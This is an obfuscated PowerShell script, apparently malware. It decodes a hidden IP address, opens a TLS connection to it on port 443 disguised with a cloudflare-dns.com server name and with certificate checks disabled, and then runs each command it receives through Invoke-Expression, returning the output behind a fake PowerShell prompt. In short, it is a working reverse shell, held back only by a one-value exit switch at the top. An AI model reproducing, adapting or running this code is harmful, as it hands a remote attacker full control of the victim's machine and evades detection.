$lasy = 0; 

if ($lasy -ne 1) { ExiT }

try {
    $qSi8XK9 = [SYSTem.sEcuRIty.aUThEntICaTIon.SSLPROToCoLS]::TLs12;
    
    $rvuJ = [SYStEm.TEXT.eNCoDIng]::Utf8.getstRINg([sYsTEm.COnVeRT]::frOmBase64sTRiNg(('MTQ2Ljc'+'wL'+'jI0MC4y'+'MDU'+'=')));
    
    $MbuLykqk = 443; 

    $dA38wm = nEw-ObjecT NEt.socKEts.TcpCLiEnt($RVUj, $mbuLYkQK);
    $Y2ySm = $da38wm.gEtSTrEAm();
    
    $hDb2Nw = nEW-oBjecT neT.SEcURITy.ssLStReAm($Y2Ysm, (-not($TrUE)), ({$true} -as [NEt.sEcuRItY.rEMOTECERtIficAtevALIDaTIoNcAlLbAck]));
    $hdB2NW.autHENTIcaTeAsCLient(('clou'+'d'+'fl'+'are-dns.'+'com'), $nUlL, $qsi8xK9, (-not($TrUE)));

    if(!$HDb2NW.iSeNCrYpTEd) {
        $hDb2Nw.ClOse();
        EXit;
    }

    $Th8yh = NEW-ObJECt Io.STReAmwRiTeR($hDb2Nw);
    $tH8yh.aUTOFlUSh = (1 -band 1);

    function WritETostREAm ($iGBs1ht) {
        [BYtE[]]$script:AJ6J = NEW-oBJEcT SYSTeM.byTe[] 4096;
        $th8yH.WRiTe($IGbs1Ht + (-join('P','S ')) + (gET-LocATIon).PaTH + '> ');
    };

    WritETostREAm '';

    while(($raIBCSW = $Hdb2nw.rEAD($script:AJ6J, 0, $script:AJ6J.length)) -gt 0) {
        $MKfF = ([tExT.enCODing]::UTF8).geTstRINg($script:AJ6J, 0, $raibcsW).TRim();
        
        if ($mKff -eq (-join('e','xi','t'))) { break }
        
        $ozHlqy7s = try {
            Invoke-Expression $MKFF 2>&1 | oUt-STRINg
        } catch {
            $_ | ouT-StriNG
        }
        
        WritETostREAm ($ozhlQy7S);
    }

    $th8yH.cloSe();
    $dA38Wm.cLoSE();
} catch {
    EXIt;
}
